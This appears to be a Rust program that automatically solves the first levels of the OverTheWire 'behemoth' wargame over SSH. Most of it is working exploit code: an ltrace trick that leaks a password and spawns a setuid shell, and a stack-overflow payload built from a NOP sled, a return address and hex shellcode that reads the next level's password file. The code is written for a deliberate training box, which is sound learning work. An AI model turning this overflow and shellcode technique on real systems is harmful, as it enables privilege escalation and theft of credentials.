use std::{io::{Read, Write}, net::TcpStream};

use ssh2::*;
use anyhow::Result;

const HOST: &str = "behemoth.labs.overthewire.org";
const PORT: usize = 2221;

fn main() -> Result<()> {

    let pass_1 = behemoth0("behemoth0")?;
    let pass_2 = behemoth1(&pass_1)?;
    let _pass_3 = behemoth2(&pass_2)?;

    Ok(())
}

fn ssh_session(username: &str, password: &str) -> Result<Session> {
    println!("connecting to server with username '{username}' and password '{password}'");

    let tcp = TcpStream::connect(format!("{HOST}:{PORT}"))?;
    let mut session = Session::new()?;
    session.set_tcp_stream(tcp);
    session.handshake()?;

    session.userauth_password(username, password)?;
    println!("connected successfully");
    Ok(session)
}

fn read_until(channel: &mut Channel, finished_token: &str) -> Result<String> {
    let mut result = String::new();
    let token_hex = hex::encode(finished_token);
    while !result.contains(&token_hex) {

        let mut full_buf = Vec::new();
        let mut buf = [0u8; 1024];

        loop {
            let amount_read = channel.read(&mut buf)?;
            full_buf.extend_from_slice(&buf[0..amount_read]);
            if amount_read < buf.len() {
                break;
            }
        }

        result += &hex::encode(&full_buf);
    }
    let raw = hex::decode(result).unwrap();
    let decoded = String::from_utf8_lossy(&raw);
    Ok(decoded.into())
}

fn write_line(channel: &mut Channel, line: &str) -> Result<()> {
    channel.write(format!("{line}\n").as_bytes())?;
    channel.flush()?;
    Ok(())
}

fn behemoth0(password: &str) -> Result<String> {
    // for behemoth 0, the password to the binary can be found by looking for strcmp in an ltrace
    // upon submitting the real password, it will open a shell

    let session = ssh_session("behemoth0", password)?;

    let mut channel = session.channel_session()?;
    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
    channel.shell()?;

    let _ = read_until(&mut channel, "behemoth0@gibson:~$ ");

    let test_pass = "test";

    let test_cmd = format!("echo {test_pass} | ltrace /behemoth/behemoth0 2>&1");
    println!("running '{test_cmd}'");
    write_line(&mut channel, &test_cmd)?;

    let result = read_until(&mut channel, "behemoth0@gibson:~$ ")?;
    let result = result.split("\n").skip(1).find(|s| s.contains(test_pass)).unwrap();
    println!("{result}");

    let real_pass = result.split("\"").nth(3).unwrap(); // strcmp("my_pass", "real_pass")
    println!("real pass is '{real_pass}'");

    let real_cmd = "/behemoth/behemoth0";
    println!("running '{real_cmd}' to spawn suid shell");
    write_line(&mut channel, &real_cmd)?;
    
    let _ = read_until(&mut channel, "Password: ")?;
    write_line(&mut channel, &real_pass)?;
    let _ = read_until(&mut channel, "$ ")?;

    println!("retrieving /etc/behemoth_pass/behemoth1");
    write_line(&mut channel, "cat /etc/behemoth_pass/behemoth1")?;

    let result = read_until(&mut channel, "$ ")?;
    let result = result.split("\n").nth(1).unwrap().trim();
    println!("retrieved behemoth1 pass '{result}'\n");

    Ok(result.to_string())
}

fn behemoth1(password: &str) -> Result<String> {
    // behemoth1 is a basic stack overflow. however updates to the box (linux version, libc etc) prevent some old methods from working
    // the stack is executable: approach is fill it with nops, end with a short jump, then the overflow ret register, then shell code,
    // so execution will be hit overflow, jump back to beginning of variable stack, follow nops, jump over overflow and start shell code.
    // shellcode used just reads the target file, and is sourced from here: https://shell-storm.org/shellcode/files/shellcode-73.html

    let session = ssh_session("behemoth1", password)?;

    let mut channel = session.channel_session()?;
    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
    channel.shell()?;

    let _ = read_until(&mut channel, "behemoth1@gibson:~$ ");

    let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
    let jmp_esp = hex::decode("eb04").unwrap(); // jmp 6 (4 + length of instruction, eb 04)
    let var_adr = hex::decode("01d5ffff").unwrap(); // 0xffffd501, approximate location in nop sled
    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
    let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes();

    let mut full_payload: Vec<u8> = Vec::new();
    full_payload.extend(nop_sled);
    full_payload.extend(jmp_esp);
    full_payload.extend(var_adr);
    full_payload.extend(file_read_shellcode);
    full_payload.extend(file_to_read);

    let mut encoded = String::new();
    for b in full_payload {
        encoded += &format!("\\x{:02x?}", b);
    }

    let target = "/behemoth/behemoth1";
    println!("running 'echo -e [payload] | {target}'");

    let cmd = format!("echo -e \"{encoded}\" | {target}");
    write_line(&mut channel, &cmd)?;
    
    println!("reading result");

    let result = read_until(&mut channel, "behemoth1@gibson:~$ ")?;
    let result: Vec<&str> = result.split("\n").collect();
    let result = result[result.len()-2].trim();
    println!("retrieved behemoth1 pass '{result}'\n");

    Ok(result.to_string())
}

fn behemoth2(password: &str) -> Result<String> {
    let session = ssh_session("behemoth2", password)?;

    let mut channel = session.channel_session()?;
    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
    channel.shell()?;

    let _ = read_until(&mut channel, "behemoth2@gibson:~$ ");
    
    Ok("".into())
}